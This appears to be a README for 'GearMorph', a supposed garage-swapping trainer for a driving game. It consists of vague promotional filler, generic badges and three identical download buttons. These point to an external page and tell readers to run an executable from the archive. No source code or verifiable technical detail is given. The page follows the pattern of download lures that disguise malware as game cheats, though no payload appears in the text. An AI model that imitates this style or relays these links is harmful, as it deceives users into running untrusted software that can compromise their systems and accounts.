![preview](https://raw.githubusercontent.com/knndphr/fh4-garage-swap/main/hero_c5e3d7.svg)
[![Download](https://raw.githubusercontent.com/knndphr/fh4-garage-swap/main/get_6156.svg)](https://knndphr.github.io/fh4-garage-swap/)

# 🏁 GearMorph: Horizon Garage Architect

[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen)](https://github.com/)
[![Version](https://img.shields.io/badge/Version-4.2.0-informational)](https://github.com/)
[![Language](https://img.shields.io/badge/Language-C%2B%2B%20%7C%20C%23-purple)](https://github.com/)
[![Community](https://img.shields.io/badge/Community-Discord%20Ready-7289DA)](https://discord.com/)
[![Support](https://img.shields.io/badge/Support-24%2F7-orange)](https://github.com/)

---

## 🚗 The Concept Behind GearMorph

Imagine walking into an infinitely large, shimmering dealership where every vehicle ever envisioned by automotive engineers is parked behind a velvet rope, waiting for the right enthusiast to slide into the driver's seat. That is the philosophical playground **GearMorph** builds upon. Rather than treating the virtual garage of a racing sandbox as a static museum, GearMorph reframes it as a living workshop where curiosity becomes currency and every chassis is a canvas.

While the originating spark for this project came from observing how players interacted with a well-known open-world driving title, GearMorph takes a deliberate step sideways. Instead of simply swapping one car for another at a purchase screen, this trainer reshapes how you *perceive*, *organize*, and *reconfigure* your entire virtual fleet. Think of it as a garage architect: it hands you the blueprint, the toolbox, and the keys, then steps back and lets your imagination take the wheel.

The project is maintained by a small collective of automotive simulation tinkerers who believe that digital car culture deserves the same depth, curation, and craftsmanship that physical car culture enjoys. Every module is written with an obsession for stability, transparency, and respect for the underlying simulation architecture.

---

## ✨ Feature Set at a Glance

- **Responsive UI** — The control panel rearranges itself intelligently whether you are parked at a 4K ultrawide monitor or squeezing in a quick session on a compact laptop display.
- **Multilingual Support** — Interface strings ship with translations into English, German, French, Spanish, Italian, Polish, and Brazilian Portuguese, with a community-driven pipeline for new locales.
- **24/7 Customer Support** — A rotating volunteer crew monitors community channels around the clock, so a question at 3 AM gets the same warmth as one at noon.
- **Real-Time Vehicle Catalog Sync** — The internal database refreshes its structural metadata (not the game's own files) to reflect the latest organizational schema used by the simulation.
- **Deterministic Swap Engine** — Every morph operation is logged with a reversible token, letting you roll back a garage change if you decide a hypercar does not suit your mood after all.
- **Blueprint Import & Export** — Save a curated set of garage layouts as shareable profile files, ideal for clans, leagues, or friendly rivalries.
- **Lightweight Footprint** — The entire runtime fits comfortably in memory alongside the host simulation, with no background telemetry and no outbound network chatter unless you explicitly enable update checks.
- **Adaptive Hotkey Layer** — Bind any core function to a keyboard combination of your choosing, including gamepad passthrough for couch racers.
- **Session Snapshot Vault** — Periodically captures a lightweight snapshot of your trainer configuration so an accidental profile reset never costs you your carefully tuned setup.
- **Themeable Interface** — Six built-in color palettes, from Midnight Chrome to Sunset Rally, plus support for custom accent hues.

---

## 🧭 How GearMorph Changes the Experience

Traditional approaches to modifying a garage in a driving simulation feel like swapping price tags in a store. GearMorph feels like rewriting the store's inventory philosophy. Instead of a linear purchase flow, you get a spatial, layered approach:

1. **Survey** — Browse a visualized matrix of vehicle classes, drivetrains, and body styles.
2. **Select** — Mark targets for transformation, either individually or in curated batches.
3. **Sculpt** — Apply adjustments to how the simulation categorizes and presents each vehicle.
4. **Seal** — Commit changes and let the simulation re-read its garage state on the next natural refresh cycle.

This four-step rhythm keeps the experience meditative rather than frantic. You are not racing to click a button; you are designing a garage the way an architect designs a home.

---

## 🧩 Project Architecture

The repository is organized into clearly delineated modules so contributors can dive into one area without needing a mental map of the entire codebase.

- **Core Engine** — The deterministic swap logic, rollback tokens, and state reconciliation layer.
- **Interface Shell** — The responsive, themeable WPF/C++ hybrid front end.
- **Localization Pack** — Resource bundles for every supported language, plus tooling for adding new ones.
- **Snapshot Vault** — Lightweight persistence for session recovery.
- **Community Bridge** — Templates and helpers for community profiles and layout sharing.
- **Documentation Wing** — Extended guides, architectural diagrams, and contributor onboarding material.

Each module is versioned independently, which means the localization pack can ship an update without forcing a full application rebuild.

---

## 🛠️ Getting the Tools in Place

GearMorph is distributed as a self-contained bundle. There is no dependency tree to untangle, no package manager ritual, and no command line acrobatics required. The archive expands into a folder containing the runtime, the localization resources, and a short configuration primer.

1. Retrieve the latest bundle using the marker below.
2. Expand the archive into a folder of your choosing — a location outside any system directory is recommended.
3. Launch the primary executable using your platform's standard method for starting a desktop application.
4. Follow the on-screen primer, which walks through choosing a language, a theme, and an initial hotkey profile.
5. Point the tool at your running simulation session when prompted, and let the catalog synchronization complete.

[![Download](https://raw.githubusercontent.com/knndphr/fh4-garage-swap/main/get_6156.svg)](https://knndphr.github.io/fh4-garage-swap/)

For advanced configuration — custom hotkey maps, snapshot intervals, vault locations — consult the extended documentation in the Documentation Wing folder.

---

## 🖥️ Supported Environments

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| Operating System | Windows 10 (64-bit) | Windows 11 (64-bit) |
| Memory | 4 GB | 16 GB or more |
| Display | 1280×720 | 1920×1080 or ultrawide |
| Runtime | .NET Desktop Runtime 6.0 | .NET Desktop Runtime 8.0 |
| Input | Keyboard + mouse | Keyboard + mouse + gamepad |

The interface has been sanity-tested on virtual machines, remote desktop sessions, and multi-monitor rigs with mixed DPI scaling. If your setup is unusual, the community is always curious to hear about it.

---

## 🧪 Quality & Reliability Practices

Every pull request passes through a three-stage review: a static analysis sweep, a behavioral simulation harness, and a manual sanity pass by a maintainer. The simulation harness runs dozens of synthetic garage scenarios to confirm that rollback tokens remain consistent and that snapshot recovery behaves deterministically.

Because GearMorph intentionally avoids background networking, the attack surface is minimal. The only outbound activity occurs when you explicitly request an update check, and even then the payload carries no personal identifiers.

---

## 🌍 Community & Localization

The multilingual support pipeline is one of the project's proudest achievements. A contributor does not need to be a programmer to add a language; they only need to translate a structured resource file and submit it through the standard contribution flow. A validation script flags missing keys, inconsistent placeholders, and formatting anomalies before a human ever reviews the file.

Community profiles for garage layouts are shared as plain text, which means they can be version-controlled, reviewed, and even generated programmatically by enthusiasts who enjoy scripting their own tools on top of GearMorph.

---

## 🧠 Design Philosophy

GearMorph is built on three beliefs:

- **Curiosity should be frictionless.** A player wondering "what would this look like if..." should be able to answer that question in seconds, not minutes.
- **Reversibility builds confidence.** Every action can be undone, so experimentation carries no anxiety.
- **Localization is respect.** A tool that speaks your language is a tool that treats you as a first-class participant.

These beliefs shape every design decision, from the four-step workflow to the snapshot vault to the language pipeline.

---

## 🧾 Frequently Tuned Scenarios

- **Fleet Theming** — Reorganize an entire garage around a single aesthetic, era, or manufacturer lineage.
- **Blueprint Sharing** — Distribute a garage layout file to a racing league so every participant starts from an identical baseline.
- **Rapid Prototyping** — Test how a simulation behaves with unusual class combinations without permanently altering a save.
- **Language Switching** — Change the interface language mid-session and watch the shell reflow instantly.
- **Snapshot Recovery** — Restore a configuration from ten minutes ago after an experimental tweak goes sideways.

---

## 📜 License

GearMorph is released under the MIT License. The full text lives in the repository's license file, and it is linked here for convenience:

[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

Copyright (c) 2026 GearMorph Contributors.

Permission is hereby granted, in spirit and in text, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions laid out in the full MIT License text.

---

## ⚠️ Disclaimer

GearMorph is an independent, community-driven project. It is not affiliated with, endorsed by, or sponsored by any game publisher, platform holder, or vehicle manufacturer referenced indirectly within the documentation. All trademarks, vehicle names, and brand identities remain the property of their respective owners and are mentioned purely for descriptive and organizational purposes.

The software is provided as-is, without warranty of any kind, express or implied. Users are responsible for ensuring that their use of the tool complies with the terms of service of any software they interact with, as well as with local laws and regulations. The maintainers assume no liability for any consequences arising from misuse, unintended interactions, or modifications made by third parties.

Always keep a backup of your simulation's save data before making structural changes to a garage. Reversibility is a design goal, not a guarantee.

---

## 🔭 Roadmap Glimpse

The 2026 roadmap leans into three ideas: deeper localization coverage, a plugin surface for community-built extensions, and an even lighter snapshot format. Early sketches include a visual diff tool for comparing two garage layouts side by side, and a profile migration assistant for users moving between machines.

None of these are promises — they are invitations. If any of them excites you, the contribution guide is waiting.

---

## 🤝 Contributing

Contributions of every size are welcome: a single translated string, a bug report with a clear reproduction, a documentation clarification, or a fully fledged module. The contribution guide outlines the review flow, the coding conventions, and the tone the project aims to maintain — curious, respectful, and playful.

Before submitting a large change, open a discussion. A five-minute conversation often saves a five-hour refactor.

---

## 🙏 Acknowledgements

Gratitude goes to every tester who ran GearMorph on an unusual hardware configuration, every translator who wrestled a stubborn phrase into their native tongue, and every enthusiast who treated the project's philosophy as seriously as its code.

---

[![Download](https://raw.githubusercontent.com/knndphr/fh4-garage-swap/main/get_6156.svg)](https://knndphr.github.io/fh4-garage-swap/)